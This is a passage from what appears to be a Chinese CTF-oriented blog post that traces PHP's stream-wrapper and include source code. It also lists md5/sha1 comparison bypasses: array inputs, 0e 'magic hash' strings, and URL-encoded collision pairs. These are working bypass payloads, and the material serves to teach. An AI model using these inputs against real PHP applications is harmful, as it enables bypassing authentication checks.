class="line">		<span class="title function_">Z_PARAM_BOOL</span><span class="params">(use_include_path)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_RESOURCE_EX</span><span class="params">(zcontext, <span class="number">1</span>, <span class="number">0</span>)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(offset)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(maxlen)</span></span><br><span class="line">	<span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ZEND_NUM_ARGS() == <span class="number">5</span> &amp;&amp; maxlen &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;length must be greater than or equal to zero&quot;</span>);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	context = php_stream_context_from_zval(zcontext, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span>,</span><br><span class="line">				(use_include_path ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS,</span><br><span class="line">				<span class="literal">NULL</span>, context);</span><br><span class="line">	<span class="keyword">if</span> (!stream) &#123;</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset != <span class="number">0</span> &amp;&amp; php_stream_seek(stream, offset, ((offset &gt; <span class="number">0</span>) ? SEEK_SET : SEEK_END)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Failed to seek to position &quot;</span> ZEND_LONG_FMT <span class="string">&quot; in the stream&quot;</span>, offset);</span><br><span class="line">		php_stream_close(stream);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (maxlen &gt; INT_MAX) &#123;</span><br><span class="line">		php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;maxlen truncated from &quot;</span> ZEND_LONG_FMT <span class="string">&quot; to %d bytes&quot;</span>, maxlen, INT_MAX);</span><br><span class="line">		maxlen = INT_MAX;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((contents = php_stream_copy_to_mem(stream, maxlen, <span class="number">0</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		RETVAL_STR(contents);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		RETVAL_EMPTY_STRING();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	php_stream_close(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看局部变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *filename;		<span class="comment">//传入的文件路径或url</span></span><br><span class="line"><span class="type">size_t</span> filename_len;	<span class="comment">//文件名长度</span></span><br><span class="line">zend_bool use_include_path = <span class="number">0</span>;		</span><br><span class="line">php_stream *stream;		<span class="comment">//打开的文件或协议流</span></span><br><span class="line">zend_long offset = <span class="number">0</span>;</span><br><span class="line">zend_long maxlen = (<span class="type">ssize_t</span>) PHP_STREAM_COPY_ALL;</span><br><span class="line">zval *zcontext = <span class="literal">NULL</span>;</span><br><span class="line">php_stream_context *context = <span class="literal">NULL</span>;</span><br><span class="line">zend_string *contents;</span><br></pre></td></tr></table></figure>

<p>然后我们看对协议流的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span>,</span><br><span class="line">            (use_include_path ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS,</span><br><span class="line">            <span class="literal">NULL</span>, context);</span><br></pre></td></tr></table></figure>

<p>我们主要看php_stream_open_wrapper_ex 函数，因为这个是处理流包装器的主要逻辑</p>
<p>在main\streams\streams.c中，我们先来看看这个函数中的参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_stream *stream = <span class="literal">NULL</span>;</span><br><span class="line">php_stream_wrapper *wrapper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *path_to_open;</span><br><span class="line"><span class="type">int</span> persistent = options &amp; STREAM_OPEN_PERSISTENT;</span><br><span class="line">zend_string *resolved_path = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span> *copy_of_path = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>其中<code>php_stream_wrapper *wrapper</code>是所选的协议封装对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!path || !*path) &#123;</span><br><span class="line">	php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Filename cannot be empty&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是检查路径合法性，否则抛出报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(path, &amp;path_to_open, options);</span><br></pre></td></tr></table></figure>

<p>这是核心逻辑，分析路径，找到合适的<strong>封装协议对象</strong>，我们跟进php_stream_locate_url_wrapper函数</p>
<p>在同一文件中进行分析找到关键代码</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101195023820.png" alt="image-20251101195023820"></p>
<p>可以看到这里会对<code>data:</code>进行特例的判断，这是因为在RFC 2397定义 <strong>Data URI Scheme</strong> 的技术规范文档中data的规范应该是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>

<p>此时也能匹配到data协议，但是其实<code>data://</code>也是符合规范的</p>
<p>写个demo测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// RFC 2397</span></span><br><span class="line"><span class="variable">$fp1</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data:,test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$meta1</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$meta1</span>[<span class="string">&#x27;wrapper_type&#x27;</span>]; <span class="comment">// RFC2397</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP wrapper</span></span><br><span class="line"><span class="variable">$fp2</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$meta2</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$meta2</span>[<span class="string">&#x27;wrapper_type&#x27;</span>]; <span class="comment">// RFC2397</span></span><br></pre></td></tr></table></figure>

<p>然后我们来看看include的源码</p>
<h3 id="include的源码实现"><a href="#include的源码实现" class="headerlink" title="include的源码实现"></a>include的源码实现</h3><p>在Zend\zend_execute.c中的zend_include_or_eval，这是 PHP Zend 引擎中处理 <strong>include&#x2F;require&#x2F;eval</strong> 的核心函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SUCCESS == zend_stream_open(ZSTR_VAL(resolved_path), &amp;file_handle)) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (!file_handle.opened_path) &#123;</span><br><span class="line">						file_handle.opened_path = zend_string_copy(resolved_path);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (zend_hash_add_empty_element(&amp;EG(included_files), file_handle.opened_path)) &#123;</span><br><span class="line">						zend_op_array *op_array = zend_compile_file(&amp;file_handle, (type==ZEND_INCLUDE_ONCE?ZEND_INCLUDE:ZEND_REQUIRE));</span><br><span class="line">						zend_destroy_file_handle(&amp;file_handle);</span><br><span class="line">						zend_string_release_ex(resolved_path, <span class="number">0</span>);</span><br><span class="line">						<span class="keyword">if</span> (Z_TYPE(tmp_inc_filename) != IS_UNDEF) &#123;</span><br><span class="line">							zval_ptr_dtor_str(&amp;tmp_inc_filename);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">return</span> op_array;</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						zend_file_handle_dtor(&amp;file_handle);</span><br><span class="line">already_compiled:</span><br><span class="line">						new_op_array = ZEND_FAKE_OP_ARRAY;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>

<p>zend_stream_open函数会尝试打开文件，这里是我们的核心，跟进一下</p>
<p>在Zend\zend_stream.c中zend_stream_open</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API <span class="type">int</span> <span class="title function_">zend_stream_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, zend_file_handle *handle)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (zend_stream_open_function) &#123;</span><br><span class="line">        <span class="comment">//如果设置了自定义的打开函数</span></span><br><span class="line">		<span class="keyword">return</span> zend_stream_open_function(filename, handle);</span><br><span class="line">	&#125;</span><br><span class="line">	handle-&gt;type = ZEND_HANDLE_FP;</span><br><span class="line">	handle-&gt;opened_path = <span class="literal">NULL</span>;</span><br><span class="line">	handle-&gt;handle.fp = zend_fopen(filename, &amp;handle-&gt;opened_path);</span><br><span class="line">	handle-&gt;filename = filename;</span><br><span class="line">	handle-&gt;free_filename = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;handle-&gt;handle.stream.mmap, <span class="number">0</span>, <span class="keyword">sizeof</span>(zend_mmap));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (handle-&gt;handle.fp) ? SUCCESS : FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进zend_stream_open_function的值</p>
<p>在PHP 中，<code>zend_stream_open_function</code> 通常在 <strong>SAPI 初始化阶段</strong>被设置</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101234410001.png" alt="image-20251101234410001"></p>
<p>然后同文件下可以找到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_stream_open_function = utility_functions-&gt;stream_open_function;</span><br></pre></td></tr></table></figure>

<p>随后跟进一下utility_functions结构体</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101234958842.png" alt="image-20251101234958842"></p>
<p>然后我们查找哪里利用结构体初始化了这个函数stream_open_function</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251101235136654.png" alt="image-20251101235136654"></p>
<p>很明显，最后zend_stream_open_function的值就是<code>php_stream_open_for_zend</code>，所以会调用php_stream_open_for_zend函数，跟进php_stream_open_for_zend函数来到php_stream_open_for_zend_ex函数</p>
<p>里面有一个处理文件流的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_stream *stream = php_stream_open_wrapper((<span class="type">char</span> *)filename, <span class="string">&quot;rb&quot;</span>, mode, &amp;opened_path);</span><br></pre></td></tr></table></figure>

<p>跟进php_stream_open_wrapper来到<code>_php_stream_open_wrapper_ex函数</code>中的zend_resolve_path相关代码段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options &amp; USE_PATH) &#123;</span><br><span class="line">	resolved_path = zend_resolve_path(path, <span class="built_in">strlen</span>(path));</span><br><span class="line">	<span class="keyword">if</span> (resolved_path) &#123;</span><br><span class="line">		path = ZSTR_VAL(resolved_path);</span><br><span class="line">		<span class="comment">/* we&#x27;ve found this file, don&#x27;t re-check include_path or run realpath */</span></span><br><span class="line">		options |= STREAM_ASSUME_REALPATH;</span><br><span class="line">		options &amp;= ~USE_PATH;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (EG(exception)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>这时候肯定会有人疑问，为什么file_get_content和include都会来到<code>_php_stream_open_wrapper_ex</code>函数，但是为什么进入的处理逻辑不一样呢？</p>
<p>让我们把视角回到php_stream_open_for_zend_ex函数中</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102001239686.png" alt="image-20251102001239686"></p>
<p>可以看到多了一个opened_path参数，并且默认是这三个值，反观file_get_content</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102001830074.png" alt="image-20251102001830074"></p>
<p>可以看到如果这里没有值的话就默认是REPORT_ERRORS，否则就是<code>USE_PATH | REPORT_ERRORS</code></p>
<p>所以这也是为什么include最终会进入<code>if (options &amp; USE_PATH) &#123;</code>的情况</p>
</blockquote>
<p>继续跟进<code>zend_resolve_path</code>，一路来到php_resolve_path_for_zend并进入php_resolve_path</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20251102003229685.png" alt="image-20251102003229685"></p>
<p>这里就是重点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (p = filename; <span class="built_in">isalnum</span>((<span class="type">int</span>)*p) || *p == <span class="string">&#x27;+&#x27;</span> || *p == <span class="string">&#x27;-&#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span>; p++);</span><br><span class="line"><span class="comment">//遍历文件名的字符，识别 URL 协议头，直到遇到不是[a-zA-Z0-9+-.]的字符</span></span><br><span class="line">	<span class="keyword">if</span> ((*p == <span class="string">&#x27;:&#x27;</span>) &amp;&amp; (p - filename &gt; <span class="number">1</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//检测是否是://协议的格式</span></span><br><span class="line">		wrapper = php_stream_locate_url_wrapper(filename, &amp;actual_path, STREAM_OPEN_FOR_INCLUDE);</span><br><span class="line">		<span class="keyword">if</span> (wrapper == &amp;php_plain_files_wrapper) &#123;</span><br><span class="line">			<span class="keyword">if</span> (tsrm_realpath(actual_path, resolved_path)) &#123;</span><br><span class="line">				<span class="keyword">return</span> zend_string_init(resolved_path, <span class="built_in">strlen</span>(resolved_path), <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>很容易就能看到，这里要求协议必须是<code>[协议头]://</code>的格式，这也是跟<code>file_get_contents</code>不同的地方</p>
<p>因此我们可以得出一个结论</p>
<blockquote>
<p>[!IMPORTANT]</p>
<p>file_get_contents函数针对<code>data:</code>协议仍然可以进行解析为data封装协议，而include在遇到<code>data:</code>的格式则会由于格式问题返回NULL</p>
</blockquote>
<h2 id="关于md5和sha1绕过"><a href="#关于md5和sha1绕过" class="headerlink" title="关于md5和sha1绕过"></a>关于md5和sha1绕过</h2><h3 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h3><p>对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
<h3 id="2-0e绕过弱比较"><a href="#2-0e绕过弱比较" class="headerlink" title="2.0e绕过弱比较"></a>2.0e绕过弱比较</h3><p>对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同</p>
<p>需要注意的是，这里不仅仅是需要加密后是0e开头的，还需要0e后面的内容是纯数字而不会有字母</p>
<p>md5加密后是0e开头的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br></pre></td></tr></table></figure>

<p>sha1加密后是0e开头的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure>

<h3 id="3-string转换后md5绕过"><a href="#3-string转换后md5绕过" class="headerlink" title="3.string转换后md5绕过"></a>3.string转换后md5绕过</h3><p>举个例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$a</span> !== (<span class="keyword">string</span>)<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$b</span>))</span><br></pre></td></tr></table></figure>

<p>这种情况下是强碰撞，如果是数组的话会导致在string转换的时候转换成null，这时候再进行md5的话就不相等了</p>
<p>md5</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psycho%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>W%ADZ%AF%<span class="number">3</span>C%<span class="number">8</span>A%<span class="number">13</span>V%B5%<span class="number">96</span>%<span class="number">18</span>m%A5%EA2%<span class="number">81</span>_%FB%D9%<span class="number">24</span>%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">8</span>F%D4D%A27vX%B8%<span class="number">08</span>%D7m%<span class="number">2</span>C%E0%D4LR%D7%FBo%<span class="number">10</span>t%<span class="number">19</span>%<span class="number">02</span>%<span class="number">82</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">2</span>B%<span class="number">9</span>Bt%<span class="number">05</span>%FFl%AE%<span class="number">8</span>DE%F4%<span class="number">1</span>F%<span class="number">84</span>%<span class="number">3</span>C%AE%<span class="number">01</span>%<span class="number">0</span>F%<span class="number">9</span>B%<span class="number">12</span>%D4%<span class="number">81</span>%A5J%F9H%<span class="number">0</span>FyE%<span class="number">2</span>A%DC%<span class="number">2</span>B%B1%B4%<span class="number">0</span>F%DEcC%<span class="number">40</span>%DA29%<span class="number">8</span>B%C3%<span class="number">00</span>%<span class="number">7</span>F%<span class="number">8</span>B_h%C6%D3%<span class="number">8</span>Bd8%AF%<span class="number">85</span>%<span class="number">7</span>C%<span class="number">14</span>w%<span class="number">06</span>%C2%<span class="number">3</span>AC%BC%<span class="number">0</span>C%<span class="number">1</span>B%FD%BB%<span class="number">98</span>%CE%<span class="number">16</span>%CE%B7%B6%<span class="number">3</span>A%F3%<span class="number">99</span>%B59%F9%FF%C2</span><br><span class="line">和</span><br><span class="line">psycho%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>W%ADZ%AF%<span class="number">3</span>C%<span class="number">8</span>A%<span class="number">13</span>V%B5%<span class="number">96</span>%<span class="number">18</span>m%A5%EA2%<span class="number">81</span>_%FB%D9%A4%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">8</span>F%D4D%A27vX%B8%<span class="number">08</span>%D7m%<span class="number">2</span>C%E0%D4LR%D7%FBo%<span class="number">10</span>t%<span class="number">19</span>%<span class="number">02</span>%<span class="number">02</span>%<span class="number">7</span>E%<span class="number">7</span>B%<span class="number">2</span>B%<span class="number">9</span>Bt%<span class="number">05</span>%FFl%AE%<span class="number">8</span>DE%F4%<span class="number">1</span>F%<span class="number">04</span>%<span class="number">3</span>C%AE%<span class="number">01</span>%<span class="number">0</span>F%<span class="number">9</span>B%<span class="number">12</span>%D4%<span class="number">81</span>%A5J%F9H%<span class="number">0</span>FyE%<span class="number">2</span>A%DC%<span class="number">2</span>B%B1%B4%<span class="number">0</span>F%DEc%C3%<span class="number">40</span>%DA29%<span class="number">8</span>B%C3%<span class="number">00</span>%<span class="number">7</span>F%<span class="number">8</span>B_h%C6%D3%<span class="number">8</span>Bd8%AF%<span class="number">85</span>%<span class="number">7</span>C%<span class="number">14</span>w%<span class="number">06</span>%C2%<span class="number">3</span>AC%<span class="number">3</span>C%<span class="number">0</span>C%<span class="number">1</span>B%FD%BB%<span class="number">98</span>%CE%<span class="number">16</span>%CE%B7%B6%<span class="number">3</span>A%F3%<span class="number">9959</span>%F9%FF%C2</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">和</span><br><span class="line">M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<p>sha1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span 